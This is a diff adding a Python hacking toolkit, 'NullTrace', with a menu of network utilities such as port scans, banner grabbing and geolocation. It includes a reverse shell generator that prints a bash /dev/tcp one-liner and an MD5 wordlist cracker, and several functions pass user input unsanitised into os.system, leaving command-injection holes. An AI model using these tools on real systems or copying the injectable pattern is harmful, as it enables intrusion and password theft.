@@ -1,0 +1,286 @@
+import os
+import sys
+import platform
+import time
+import hashlib
+import socket
+import subprocess
+import random
+import string
+import urllib.request
+import requests
+
+def clear_screen():
+    os.system('cls' if platform.system().lower() == 'windows' else 'clear')
+
+def loading_screen():
+    clear_screen()
+    print("🔧 Initializing NullTrace Toolkit...")
+    animation = ["[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]",
+                 "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]",
+                 "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]",
+                 "[■■■■■■■■■■]"]
+    for frame in animation:
+        print(f"\r🔄 Loading {frame}", end="")
+        time.sleep(0.1)
+    print("\n✅ Loaded successfully!")
+    time.sleep(0.5)
+
+def ping_host():
+    target = input("Enter target IP or hostname: ").strip()
+    if not target:
+        print("❌ Target cannot be empty.")
+        return
+    count = input("How many packets to send? (default 4): ").strip()
+    count = count if count.isdigit() else "4"
+    param = "-n" if platform.system().lower() == "windows" else "-c"
+    os.system(f"ping {param} {count} {target}")
+
+def whois_lookup():
+    domain = input("Enter domain (example.com): ").strip()
+    if not domain:
+        print("❌ Domain is empty.")
+        return
+    os.system(f"whois {domain}" if platform.system() != "windows" else f"whois {domain}")
+
+def port_scan():
+    host = input("Enter target IP or hostname: ").strip()
+    ports = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3389]
+    print(f"🔍 Scanning common ports on {host}...")
+    for port in ports:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(0.5)
+            result = sock.connect_ex((host, port))
+            if result == 0:
+                print(f"✅ Port {port} is open")
+            else:
+                print(f"❌ Port {port} is closed")
+
+def ip_config():
+    if platform.system().lower() == 'windows':
+        os.system("ipconfig")
+    else:
+        os.system("ifconfig")
+
+def hash_generator():
+    text = input("Enter text to hash: ")
+    print("MD5:       ", hashlib.md5(text.encode()).hexdigest())
+    print("SHA1:      ", hashlib.sha1(text.encode()).hexdigest())
+    print("SHA256:    ", hashlib.sha256(text.encode()).hexdigest())
+
+def traceroute():
+    target = input("Enter target IP or hostname: ").strip()
+    command = "tracert" if platform.system().lower() == "windows" else "traceroute"
+    os.system(f"{command} {target}")
+
+def dns_lookup():
+    domain = input("Enter domain (example.com): ").strip()
+    try:
+        ip = socket.gethostbyname(domain)
+        print(f"✅ {domain} resolves to {ip}")
+    except socket.gaierror:
+        print("❌ DNS resolution failed.")
+
+def check_open_ports():
+    host = input("Enter IP to check port range 1-1024: ").strip()
+    print("⏳ Checking ports (this might take a while)...")
+    for port in range(1, 1025):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.1)
+                if s.connect_ex((host, port)) == 0:
+                    print(f"✅ Port {port} open")
+        except Exception:
+            pass
+
+def show_mac_addresses():
+    os.system("getmac" if platform.system().lower() == "windows" else "ifconfig -a")
+
+def scan_wifi_networks():
+    if platform.system().lower() == 'windows':
+        os.system("netsh wlan show networks mode=bssid")
+    else:
+        print("❌ Wi-Fi scan only supported on Windows in this version.")
+
+def generate_password():
+    length = input("Enter desired password length (default 12): ").strip()
+    length = int(length) if length.isdigit() else 12
+    characters = string.ascii_letters + string.digits + string.punctuation
+    password = ''.join(random.choice(characters) for _ in range(length))
+    print("🔐 Generated Password:", password)
+
+def check_website_status():
+    url = input("Enter website URL (e.g. https://example.com): ").strip()
+    try:
+        response = urllib.request.urlopen(url)
+        print(f"✅ Website is UP. Status Code: {response.getcode()}")
+    except Exception as e:
+        print(f"❌ Website is DOWN or unreachable. Reason: {e}")
+
+def subnet_calculator():
+    import ipaddress
+    subnet = input("Enter IP/subnet (e.g. 192.168.1.0/24): ").strip()
+    try:
+        net = ipaddress.ip_network(subnet, strict=False)
+        print(f"Network: {net.network_address}")
+        print(f"Broadcast: {net.broadcast_address}")
+        print(f"Netmask: {net.netmask}")
+        print(f"Total hosts: {net.num_addresses}")
+    except ValueError:
+        print("❌ Invalid subnet.")
+
+def list_processes():
+    os.system("tasklist" if platform.system().lower() == "windows" else "ps aux")
+
+def show_system_info():
+    print("System Information:")
+    print(f"System: {platform.system()}")
+    print(f"Node Name: {platform.node()}")
+    print(f"Release: {platform.release()}")
+    print(f"Version: {platform.version()}")
+    print(f"Machine: {platform.machine()}")
+    print(f"Processor: {platform.processor()}")
+
+def list_current_directory():
+    print("Files in current directory:")
+    for f in os.listdir('.'):
+        print(f)
+
+def show_env_variables():
+    for key, value in os.environ.items():
+        print(f"{key} = {value}")
+
+def show_python_version():
+    print(f"Python Version: {sys.version}")
+
+def get_geolocation():
+    ip = input("Enter IP address to locate: ").strip()
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}").json()
+        if response['status'] == 'success':
+            print(f"🌍 Location Info for {ip}:")
+            for k in ['country', 'regionName', 'city', 'zip', 'lat', 'lon', 'org', 'as']:
+                print(f"{k.capitalize()}: {response.get(k)}")
+        else:
+            print("❌ Failed to get location info.")
+    except Exception as e:
+        print(f"❌ Error: {e}")
+
+def reverse_dns_lookup():
+    ip = input("Enter IP address: ").strip()
+    try:
+        name = socket.gethostbyaddr(ip)
+        print(f"✅ Reverse DNS for {ip}: {name[0]}")
+    except Exception as e:
+        print(f"❌ Could not resolve: {e}")
+
+def banner_grabber():
+    host = input("Enter host: ").strip()
+    port = int(input("Enter port: ").strip())
+    try:
+        with socket.socket() as s:
+            s.settimeout(2)
+            s.connect((host, port))
+            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
+            banner = s.recv(1024).decode()
+            print("📄 Banner:\n", banner)
+    except Exception as e:
+        print(f"❌ Error: {e}")
+
+def reverse_shell_generator():
+    ip = input("Enter your IP: ")
+    port = input("Enter your port: ")
+    print("\n🛠 Reverse Shell Command (Bash):")
+    print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
+
+def simple_md5_cracker():
+    target_hash = input("Enter MD5 hash to crack: ")
+    wordlist = input("Path to wordlist (default 'rockyou.txt'): ") or "rockyou.txt"
+    try:
+        with open(wordlist, "r", encoding='latin-1') as f:
+            for word in f:
+                word = word.strip()
+                if hashlib.md5(word.encode()).hexdigest() == target_hash:
+                    print(f"✅ Hash cracked! Password: {word}")
+                    return
+        print("❌ Password not found in wordlist.")
+    except FileNotFoundError:
+        print("❌ Wordlist not found.")
+
+def get_public_ip():
+    try:
+        ip = requests.get('https://api.ipify.org').text
+        print(f"🌐 Your Public IP is: {ip}")
+    except:
+        print("❌ Couldn't fetch public IP.")
+
+def exit_program():
+    print("\nExiting NullTrace Toolkit. Goodbye!")
+    sys.exit(0)
+
+def print_banner():
+    red = "\033[91m"
+    reset = "\033[0m"
+    banner = r"""
+  __        _______      _    ____  _____ 
+  \ \      / / ____|    / \  |  _ \| ____|
+   \ \ /\ / /|  _|     / _ \ | |_) |  _|  
+    \ V  V / | |___   / ___ \|  _ <| |___ 
+     \_/\_/  |_____| /_/   \_\_| \_\_____|
+                                          
+ _   _ _   _ _     _   _____ ____      _    ____ _____ 
+| \ | | | | | |   | | |_   _|  _ \    / \  / ___| ____|
+|  \| | | | | |   | |   | | | |_) |  / _ \| |   |  _|  
+| |\  | |_| | |___| |___| | |  _ <  / ___ \ |___| |___ 
+|_| \_|\___/|_____|_____|_| |_| \_\/_/   \_\____|_____|
+"""
+    print(f"{red}{banner}{reset}")
+
+def menu():
+    loading_screen()
+    options = {
+        "1": ("Whois Lookup", whois_lookup),
+        "2": ("Ping a Host", ping_host),
+        "3": ("Port Scan", port_scan),
+        "4": ("IP Config", ip_config),
+        "5": ("Hash Generator", hash_generator),
+        "6": ("Traceroute", traceroute),
+        "7": ("DNS Lookup", dns_lookup),
+        "8": ("Check Open Ports", check_open_ports),
+        "9": ("MAC Addresses", show_mac_addresses),
+        "10": ("Wi-Fi Networks (Windows Only)", scan_wifi_networks),
+        "11": ("Generate Password", generate_password),
+        "12": ("Check Website Status", check_website_status),
+        "13": ("Subnet Calculator", subnet_calculator),
+        "14": ("List Processes", list_processes),
+        "15": ("Clear Screen", clear_screen),
+        "16": ("System Info", show_system_info),
+        "17": ("List Current Directory", list_current_directory),
+        "18": ("Environment Variables", show_env_variables),
+        "19": ("Python Version", show_python_version),
+        "20": ("IP Geolocation", get_geolocation),
+        "21": ("Reverse DNS Lookup", reverse_dns_lookup),
+        "22": ("Banner Grabber", banner_grabber),
+        "23": ("Reverse Shell Generator", reverse_shell_generator),
+        "24": ("MD5 Password Cracker", simple_md5_cracker),
+        "25": ("Get Public IP", get_public_ip),
+        "26": ("Exit", exit_program)
+    }
+
+    while True:
+        clear_screen()
+        print_banner()
+        print("=== NULLTRACE TOOLKIT MENU ===\n")
+        for num in range(1, 27):
+            print(f"{num:2}. {options[str(num)][0]}")
+        choice = input("\nSelect an option (1-26): ").strip()
+        if choice in options:
+            clear_screen()
+            options[choice][1]()
+            input("\nPress Enter to return to menu...")
+        else:
+            print("Invalid option.")
+            input("Press Enter to try again...")
+
+if __name__ == "__main__":
+    menu()
